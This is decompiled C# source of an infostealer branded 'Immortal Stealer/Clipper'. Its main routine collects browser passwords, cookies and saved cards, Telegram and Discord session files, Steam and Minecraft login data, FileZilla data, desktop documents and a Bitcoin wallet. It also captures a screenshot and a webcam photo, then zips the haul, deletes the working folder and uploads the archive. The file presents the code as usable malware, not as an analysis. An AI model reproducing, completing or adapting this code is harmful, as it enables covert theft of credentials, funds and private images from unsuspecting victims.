using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Immortal.Stealer;
using Microsoft.Win32;

// Token: 0x02000010 RID: 16
internal static class Class9
{
	// Token: 0x06000029 RID: 41
	public static void stealer_main_routine()
	{
		string text = Class8.Random_string();
		string text2 = Path.GetTempPath() + text;
		Directory.CreateDirectory(text2);
		using (StreamWriter streamWriter = new StreamWriter(text2 + "\\passwords.log"))
		{
			streamWriter.WriteLine(string.Concat(new string[]
			{
				"[==================== Immortal Stealer/Clipper ====================]\r\n[=================== Create By Zet5D ===================]\r\n[=================== Telegram: @Zet5D ===================]\r\n",
				string.Format("Date: {0}\r\n", DateTime.Now),
				string.Format("Windows Username: {0}\r\n", Environment.UserName),
				string.Format("HWID: {0}\r\n", Class2.hwid),
				string.Format("System: {0}\r\n", Class9.define_windows())
			}));
			try
			{
				foreach (PassData value in Chromium.Initialise())
				{
					streamWriter.WriteLine(value);
				}
			}
			catch
			{
			}
		}
		try
		{
			Class9.grab_desktop(text2);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
		try
		{
			Class9.grab_minecraft(text2);
		}
		catch (Exception)
		{
		}
		try
		{
			Class9.grab_telegram(text2);
		}
		catch (Exception)
		{
		}
		try
		{
			Class9.grab_discord(text2);
		}
		catch (Exception)
		{
		}
		try
		{
			Class9.get_screenshot(text2 + "\\desktop.jpg");
		}
		catch (Exception ex2)
		{
			Console.WriteLine(ex2.ToString());
		}
		try
		{
			Class9.Class10.get_webcam(text2 + "\\CamPicture.png");
		}
		catch (Exception ex3)
		{
			Console.WriteLine(ex3.ToString());
		}
		try
		{
			Class4.grab_cookies(text2 + "\\");
		}
		catch (Exception ex4)
		{
			Console.WriteLine(ex4.ToString());
		}
		try
		{
			Class14.grab_cards(text2 + "\\");
		}
		catch (Exception ex5)
		{
			Console.WriteLine(ex5.ToString());
		}
		try
		{
			GrabForms.grab_forms(text2 + "\\");
		}
		catch (Exception ex6)
		{
			Console.WriteLine(ex6.ToString());
		}
		try
		{
			Class6.Class7.get_filezilla(text2 + "\\");
		}
		catch (Exception ex7)
		{
			Console.WriteLine(ex7.ToString());
		}
		try
		{
			string bitcoin = CryptoWallets.get_bitcoin();
			if (bitcoin != "" && File.Exists(bitcoin))
			{
				File.Copy(bitcoin, text2 + "\\wallet.dat");
			}
		}
		catch (Exception ex8)
		{
			Console.WriteLine(ex8.ToString());
		}
		try
		{
			Class9.zip_folder(text2, Path.GetTempPath() + "\\" + text + ".zip");
		}
		catch (Exception ex9)
		{
			Console.WriteLine(ex9.ToString());
		}
		try
		{
			Class9.delete_folder(text2);
		}
		catch (Exception ex10)
		{
			Console.WriteLine(ex10.ToString());
		}
		try
		{
			Internet.upload_file(Path.GetTempPath() + "\\" + text + ".zip");
		}
		catch (Exception ex11)
		{
			Console.WriteLine(ex11.ToString());
		}
	}

	// Token: 0x0600002A RID: 42
	private static void zip_folder(string string_0, string string_1)
	{
		ZipFile.CreateFromDirectory(string_0, string_1, CompressionLevel.Fastest, false, Encoding.UTF8);
	}

	// Token: 0x0600002B RID: 43
	public static string define_windows()
	{
		string result;
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				text = managementBaseObject["Caption"].ToString();
			}
			if (text.Contains("8"))
			{
				result = "Windows 8";
			}
			else if (text.Contains("8.1"))
			{
				result = "Windows 8.1";
			}
			else if (text.Contains("10"))
			{
				result = "Windows 10";
			}
			else if (text.Contains("XP"))
			{
				result = "Windows XP";
			}
			else if (text.Contains("7"))
			{
				result = "Windows 7";
			}
			else
			{
				result = (text.Contains("Server") ? "Windows Server" : "Unknown");
			}
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x0600002C RID: 44
	private static void grab_desktop(string string_0)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
			{
				if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log") || !(fileInfo.Extension != ".sql"))
				{
					Directory.CreateDirectory(string_0 + "\\Files\\");
					fileInfo.CopyTo(string_0 + "\\Files\\" + fileInfo.Name);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	// Token: 0x0600002D RID: 45
	private static void grab_telegram(string string_0)
	{
		Directory.CreateDirectory(string_0 + "\\Telegram");
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1", string_0 + "\\Telegram\\D877F783D5D3EF8C1", true);
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0", string_0 + "\\Telegram\\D877F783D5D3EF8C0", true);
		}
		catch
		{
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map1", string_0 + "\\Telegram\\map1", true);
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map0", string_0 + "\\Telegram\\map0", true);
		}
		catch
		{
		}
	}

	// Token: 0x0600002E RID: 46
	private static void grab_discord(string string_0)
	{
		Directory.CreateDirectory(string_0 + "\\Discord");
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", string_0 + "\\Discord\\https_discordapp.com_0.localstorage", true);
		}
		catch
		{
		}
	}

	// Token: 0x0600002F RID: 47
	private static void grab_minecraft(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("AppData");
		Environment.GetEnvironmentVariable("LocalAppData");
		string environmentVariable2 = Environment.GetEnvironmentVariable("userprofile");
		Environment.GetEnvironmentVariable("username");
		try
		{
			if (File.Exists(environmentVariable + "\\.minecraftonly\\userdata"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftOnly\\");
				File.Copy(environmentVariable + "\\.minecraftonly\\userdata", string_0 + "\\Applications\\MinecraftOnly\\userdata", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(environmentVariable + "\\.vimeworld\\config"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\VimeWorld\\");
				File.Copy(environmentVariable + "\\.vimeworld\\config", string_0 + "\\Applications\\VimeWorld\\config", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(environmentVariable2 + "\\McSkill\\settings.bin"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\McSkill\\");
				File.Copy(environmentVariable2 + "\\McSkill\\settings.bin", string_0 + "\\Applications\\McSkill\\settings.bin", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Valve").OpenSubKey("Steam");
			string text = (string)registryKey.GetValue("SteamPath");
			if (File.Exists(text + "\\Steam.exe"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\");
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\config");
				}
				foreach (FileInfo fileInfo in new DirectoryInfo(text).GetFiles())
				{
					if (fileInfo.Name.Contains("ssfn"))
					{
						fileInfo.CopyTo(string_0 + "\\Applications\\Steam\\" + fileInfo.Name);
					}
				}
				File.Copy(text + "\\config\\config.vdf", string_0 + "\\Applications\\Steam\\config\\config.vdf", true);
				File.Copy(text + "\\config\\loginusers.vdf", string_0 + "\\Applications\\Steam\\config\\loginusers.vdf", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(environmentVariable + "\\.LavaServer\\Settings.reg"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\LavaCraft\\");
				File.Copy(environmentVariable + "\\.LavaServer\\Settings.reg", string_0 + "\\Applications\\LavaCraft\\Settings.reg", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(environmentVariable + "\\.minecraft\\launcher_profiles.json"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftLauncher\\");
				File.Copy(environmentVariable + "\\.minecraft\\launcher_profiles.json", string_0 + "\\Applications\\MinecraftLauncher\\launcher_profiles.json", true);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(environmentVariable + "\\.redserver\\authdata"))
			{
				Directory.CreateDirectory(string_0 + "\\Applications\\RedServer\\");
				File.Copy(environmentVariable + "\\.redserver\\authdata", string_0 + "\\Applications\\RedServer\\authdata", true);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000030 RID: 48
	private static void delete_folder(string string_0)
	{
		try
		{
			foreach (DirectoryInfo directoryInfo in new DirectoryInfo(string_0).GetDirectories())
			{
				foreach (FileInfo fileSystemInfo in directoryInfo.GetFiles())
				{
					fileSystemInfo.Delete();
				}
				directoryInfo.Delete();
			}
			foreach (FileInfo fileSystemInfo2 in new DirectoryInfo(string_0).GetFiles())
			{
				fileSystemInfo2.Delete();
			}
			Directory.Delete(string_0);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	// Token: 0x06000031 RID: 49
	private static void get_screenshot(string string_0)
	{
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(string_0, ImageFormat.Jpeg);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	// Token: 0x02000011 RID: 17
	internal class Class10
	{
		// Token: 0x06000032 RID: 50 RVA: 0x000023E6 File Offset: 0x000005E6
		[CompilerGenerated]
		public static object smethod_0()
		{
			return Class9.Class10.object_0;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000023ED File Offset: 0x000005ED
		[CompilerGenerated]
		private static void smethod_1(object object_1)
		{
			Class9.Class10.object_0 = object_1;
		}

		// Token: 0x06000034 RID: 52
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

		// Token: 0x06000035 RID: 53
		[DllImport("user32")]
		public static extern int SendMessage(IntPtr intptr_0, uint uint_0, int int_0, int int_1);

		// Token: 0x06000036 RID: 54
		internal static void get_webcam(string string_0)
		{
			IntPtr intPtr = Marshal.StringToHGlobalAnsi(string_0);
			IntPtr intptr_ = Class9.Class10.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
			Class9.Class10.SendMessage(intptr_, 1034u, 0, 0);
			Class9.Class10.SendMessage(intptr_, 1034u, 0, 0);
			Class9.Class10.SendMessage(intptr_, 1049u, 0, intPtr.ToInt32());
			Class9.Class10.SendMessage(intptr_, 1035u, 0, 0);
			Class9.Class10.SendMessage(intptr_, 16u, 0, 0);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x0000237E File Offset: 0x0000057E
		public Class10()
		{
			Class17.jLpoVv1z2TmaE();
			base..ctor();
		}

		// Token: 0x04000016 RID: 22
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private static object object_0;
	}
}
